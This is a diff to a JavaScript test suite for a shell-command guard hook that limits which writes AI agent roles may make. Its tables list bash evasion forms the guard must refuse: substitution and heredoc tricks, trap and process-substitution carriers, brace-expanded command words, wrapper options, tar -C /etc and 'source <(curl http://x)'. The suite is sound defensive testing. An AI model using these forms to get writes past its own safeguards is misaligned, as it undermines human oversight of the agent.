@@ -9,7 +9,7 @@ import assert from 'node:assert/strict';
 import { dirname, join } from 'node:path';
 import { pathToFileURL } from 'node:url';
 import { buildTemplate, copyProject, runHook, rmSync, nodeHook, cleanEnv } from './harness.mjs';
-import { tokenize, roleActions, rewriteAnsiC, MAX_DEPTH } from '../../adapters/claude/hooks/guards/rolewrites.mjs';
+import { tokenize, roleActions, safeRoleActions, newGuard, rewriteAnsiC, MAX_DEPTH } from '../../adapters/claude/hooks/guards/rolewrites.mjs';
 import { WRITE_PROGRAMS } from '../../adapters/claude/hooks/command-scan.mjs';
 
 // The verdicts are asked in process (the same buildContext and PreToolUse handler the hook process runs; one test spawns the real hook to prove they agree): a hook process per question made the file take minutes.
@@ -658,11 +658,161 @@ test('A273 round 3: the depth bound fails closed with its own reason, and a comm
 test('A273 round 3: the tokenizer stays linear on pathological input with recursion (a quadratic or exponential reader would not finish)', () => {
   const denies = (/** @type {string} */ c) => roleActions(c).actions.some((a) => a.kind === 'deny');
   assert.ok(denies('$('.repeat(100000)));
-  assert.equal(roleActions('`'.repeat(100001)).actions.length, 0);
+  assert.equal(roleActions('`'.repeat(100000)).actions.length, 0);
+  assert.ok(denies('`'.repeat(100001)), 'an unterminated backtick is a doubt');
   assert.ok(Array.isArray(roleActions("sh -c '".repeat(50000)).actions));
   assert.ok(denies('"$('.repeat(60000)));
   assert.equal(roleActions(`${'{ '.repeat(100000)}mkdir /etc/x`).actions.length, 1);
   assert.ok(denies('echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(mkdir /etc/x)))))))))'.repeat(2000)));
-  assert.equal(roleActions('cat <<EOF\n$(mkdir /etc/x)\nEOF\n'.repeat(20000)).actions.length, 20000);
+  const heredocs = roleActions('cat <<EOF\n$(mkdir /etc/x)\nEOF\n'.repeat(20000)).actions;
+  assert.equal(heredocs.filter((a) => a.kind === 'target').length, 20000);
+  assert.ok(heredocs.some((a) => a.kind === 'deny' && /nested regions/.test(a.why)), 'too many nested regions are refused');
   assert.ok(Array.isArray(roleActions('echo "$(echo " '.repeat(30000)).actions));
+});
+
+// ---- Review round 4 (A273): where the tokenizer is not certain how bash reads a region, the roles are refused. The lead's verdict is pinned to what 0dd2df54 gave (it never changes);
+// a row that 0dd2df54 already refused for both roles by another rule is tagged.
+const R4_R4_DOUBT_INSIDE_SUBSTITUTION = /** @type {Array<[string, 'allow' | 'refuse']>} */ ([
+  ["echo $(echo $'x')", 'allow'],
+  ["echo $(echo $'a\\'b'; mkdir /etc/x)", 'allow'],
+  ["echo $(echo hi # )\nmkdir /etc/x)", 'allow'],
+  ["echo $(case x in x) echo y;; esac); mkdir /etc/x", 'allow'],
+  ["echo $(echo ${x#)}; mkdir /etc/x)", 'allow'],
+  ["echo $(echo ${y:-)}; mkdir /etc/x)", 'allow'],
+  ["echo $(echo $((1<<2))\nmkdir /etc/x)", 'allow'],
+  ["cat <(echo $'a')", 'allow'],
+  ["echo `echo hi # `\nmkdir /etc/x", 'allow'],
+  ["echo $(echo \"a\nmkdir /etc/x)", 'allow'],
+  ["echo 'abc; mkdir /etc/x", 'allow'],
+  ["echo $(mkdir /etc/x", 'allow'],
+  ["x=${y:-$(mkdir /etc/x)", 'allow'],
+]);
+const R4_R4_ARITHMETIC_OR_SUBSHELL = /** @type {Array<[string, 'allow' | 'refuse']>} */ ([
+  ["$((echo a) ; (mkdir /etc/x))", 'refuse'],
+  ["((echo a); (echo q > /etc/x))", 'refuse'],
+  ["echo $((echo a); (mkdir /etc/x))", 'allow'],
+  ["echo $(( (echo a) ; (touch /etc/x) ))", 'allow'],
+]);
+const R4_R4_CODE_CARRIER = /** @type {Array<[string, 'allow' | 'refuse']>} */ ([
+  ["trap 'mkdir /etc/x' EXIT", 'allow'],
+  ["trap 'mkdir /etc/x' ERR", 'allow'],
+  ["trap -- 'mkdir /etc/x' DEBUG", 'allow'],
+  ["trap 'mkdir /etc/x' 0", 'allow'],
+  ["trap 'mkdir /etc/x' SIGINT", 'allow'],
+  ["printf 'mkdir /etc/x' | sh -", 'allow'],
+  ["echo 'mkdir /etc/x' | sh /dev/stdin", 'allow'],
+  ["sh <<< \"mkdir /etc/x\"", 'refuse'],
+  ["source /dev/stdin <<< \"mkdir /etc/x\"", 'allow'],
+  [". <(echo \"mkdir /etc/x\")", 'allow'],
+  ["source <(echo \"mkdir /etc/x\")", 'allow'],
+  ["bash <(echo \"mkdir /etc/x\")", 'refuse'],
+  ["source <(curl http://x)", 'allow'],
+  ["sh -s <<'EOF'\nmkdir /etc/x\nEOF", 'refuse'],
+]);
+const R4_R4_COMMAND_WORD = /** @type {Array<[string, 'allow' | 'refuse']>} */ ([
+  ["{mkdir,} /etc/x", 'allow'],
+  ["{mkdir,true} /etc/x", 'allow'],
+  ["/bin/m?dir /etc/x", 'allow'],
+  ["/bin/mkdi[r] /etc/x", 'allow'],
+  ["echo x; {mkdir,touch} /etc/x", 'allow'],
+]);
+const R4_R4_WRAPPER_OPTION = /** @type {Array<[string, 'allow' | 'refuse']>} */ ([
+  ["env -P /bin mkdir /etc/x", 'allow'],
+  ["env -S \"mkdir /etc/x\"", 'refuse'],
+  ["taskset -c 0 mkdir /etc/x", 'allow'],
+  ["taskset 1 mkdir /etc/x", 'allow'],
+  ["timeout -s KILL 5 mkdir /etc/x", 'allow'],
+  ["ionice -c 3 mkdir /etc/x", 'allow'],
+  ["nice -n 5 mkdir /etc/x", 'allow'],
+  ["stdbuf -o0 mkdir /etc/x", 'allow'],
+  ["setsid mkdir /etc/x", 'allow'],
+  ["setsid -w mkdir /etc/x", 'allow'],
+  ["nohup mkdir /etc/x", 'allow'],
+  ["env --bogus mkdir /etc/x", 'allow'],
+  ["nohup -x mkdir /etc/x", 'allow'],
+  ["timeout --bogus 5 mkdir /etc/x", 'allow'],
+  ["sudo -i mkdir /etc/x", 'allow'],
+]);
+const R4_R4_TAR_OLD_STYLE = /** @type {Array<[string, 'allow' | 'refuse']>} */ ([
+  ["tar xf a -C /etc", 'refuse'],
+  ["tar x -C /etc -f a", 'refuse'],
+  ["tar xzf a --directory /etc", 'refuse'],
+  ["tar c -f /etc/o a", 'allow'],
+  ["tar xf a -C$V", 'refuse'],
+]);
+const ALREADY_R4 = new Set(["echo $(echo $'a\\'b'; mkdir /etc/x)","echo $(echo hi # )\nmkdir /etc/x)","echo $(case x in x) echo y;; esac); mkdir /etc/x","echo $(echo ${x#)}; mkdir /etc/x)","echo $(echo ${y:-)}; mkdir /etc/x)","echo $(echo $((1<<2))\nmkdir /etc/x)","echo `echo hi # `\nmkdir /etc/x","echo $(mkdir /etc/x","x=${y:-$(mkdir /etc/x)","$((echo a) ; (mkdir /etc/x))","((echo a); (echo q > /etc/x))","sh <<< \"mkdir /etc/x\"","bash <(echo \"mkdir /etc/x\")","sh -s <<'EOF'\nmkdir /etc/x\nEOF","env -S \"mkdir /etc/x\"","taskset 1 mkdir /etc/x","timeout -s KILL 5 mkdir /etc/x","ionice -c 3 mkdir /etc/x","nice -n 5 mkdir /etc/x","stdbuf -o0 mkdir /etc/x","nohup mkdir /etc/x","env --bogus mkdir /etc/x","nohup -x mkdir /etc/x","timeout --bogus 5 mkdir /etc/x","sudo -i mkdir /etc/x","tar xf a -C /etc","tar x -C /etc -f a","tar xzf a --directory /etc","tar xf a -C$V"]);
+const R4_ALLOWED = [
+ "bash -c 'cd src && ls'",
+ "echo \"$(dirname impl.txt)\"",
+ "cat \"$(dirname impl.txt)/impl.txt\"",
+ "grep -r foo \"$(git rev-parse --show-toplevel)\"",
+ "git commit -m \"$(cat <<'EOF'\n## Summary\n- it's `fine` # note\nEOF\n)\"",
+ "trap \"echo bye\" EXIT",
+ "timeout -s KILL 5 npm test",
+ "taskset -c 0 node a.js",
+ "nice -n 5 npm test",
+ "env NODE_ENV=test node a.js",
+ "env -i node a.js",
+ "x=$(echo ${y:-z})",
+ "echo $(echo ${x#abc})",
+ "[ -f impl.txt ] && echo ok",
+ "[[ -n $x ]] && echo ok",
+ "source .venv/bin/activate",
+ "stdbuf -oL npm test",
+ "nohup node a.js",
+ "tar -tf a.tar",
+ "tar xf a.tar",
+ "echo $(git rev-parse HEAD)",
+ "echo $(cat <<EOF\nhello # world\nEOF\n)"
+];
+const R4_GROUPS = /** @type {Array<[string, Array<[string, 'allow' | 'refuse']>]>} */ ([["R4 doubt inside substitution", R4_R4_DOUBT_INSIDE_SUBSTITUTION], ["R4 arithmetic or subshell", R4_R4_ARITHMETIC_OR_SUBSHELL], ["R4 code carrier", R4_R4_CODE_CARRIER], ["R4 command word", R4_R4_COMMAND_WORD], ["R4 wrapper option", R4_R4_WRAPPER_OPTION], ["R4 tar old style", R4_R4_TAR_OLD_STYLE]]);
+
+for (const [group, rows] of R4_GROUPS) {
+  for (const [command, leadExpected] of rows) {
+    test(`A273 round 4 (${group}): ${JSON.stringify(command)}${ALREADY_R4.has(command) ? ' (already refused on 0dd2df54 by another rule)' : ''}: refused for both roles; the lead stays ${leadExpected}`, async () => {
+      for (const [role, who, env] of ROLES) assert.ok(await pre(command, who, env), `${role}: allowed`);
+      const lead = await pre(command, LEAD[1], LEAD[2]);
+      if (leadExpected === 'allow') assert.equal(lead, null, `the lead's verdict changed: ${lead}`);
+      else assert.ok(lead, 'the lead no longer refuses this form');
+    });
+  }
+}
+
+for (const command of R4_ALLOWED) {
+  test(`A273 round 4 (stays allowed, AC-4): ${JSON.stringify(command)}`, async () => {
+    for (const [role, who, env] of ROLES) assert.equal(await pre(command, who, env), null, `${role}: refused`);
+  });
+}
+
+// The work counter counts steps (characters and tokens read in every nested scan), never time: the budget is 64 steps per character and a constant, and the scan stops when it is spent.
+const WORK_INPUTS = /** @type {Array<[string, string, boolean]>} */ ([
+  ['160,000 open parentheses after a redirect (the quadratic endParen probe at every ((', `echo x > $OUT/a\n${'('.repeat(160000)}`, true],
+  ['30,000 pipes into a shell (the quadratic pipeline walk)', `echo x${' | sh'.repeat(30000)}`, true],
+  ['100,000 nested substitution openers', '$('.repeat(100000), false],
+]);
+for (const [name, command, viaHook] of WORK_INPUTS) {
+  test(`A273 round 4: ${name}: the step counter stays inside its linear budget${viaHook ? ' and the implementer is refused' : ' and the scan refuses'}`, async () => {
+    const st = newGuard(command.length);
+    const limit = st.budget;
+    tokenize(command, 0, st);
+    assert.ok(st.budget >= 0, 'the scan went on after the budget was spent');
+    assert.ok(limit - st.budget <= limit, 'more steps than the budget');
+    assert.ok(limit - st.budget > command.length, 'the counter counts the work of every nested scan, not only the characters');
+    if (viaHook) assert.ok(await pre(command, ROLES[0][1], ROLES[0][2]), 'implementer: allowed'); // one role: the rest of the hook reads a 150 KB command in about a second
+    else assert.ok(roleActions(command).actions.some((a) => a.kind === 'deny'), 'the scan did not refuse');
+  });
+}
+
+test('A273 round 4: an internal error in the role scan is a refusal (fail closed)', () => {
+  const ra = safeRoleActions('echo hi', () => { throw new Error('forced'); });
+  assert.ok(ra.actions.some((a) => a.kind === 'deny' && /forced/.test(a.why)));
+  assert.equal(safeRoleActions('echo hi').actions.length, 0);
+});
+
+test('A273 round 4: the principle is pinned by the unterminated region, the unknown wrapper option and the brace command word (each one a deny action of its own)', () => {
+  const why = (/** @type {string} */ c) => roleActions(c).actions.filter((a) => a.kind === 'deny').map((a) => a.kind === 'deny' ? a.why : '').join('|');
+  assert.match(why('echo "abc'), /cannot read the way bash does|unterminated/);
+  assert.match(why('env --bogus true'), /wrapper an option the hook does not know/);
+  assert.match(why('{true,true} x'), /brace expansion/);
+  assert.match(why('echo $(echo $\'x\')'), /\$'/);
 });
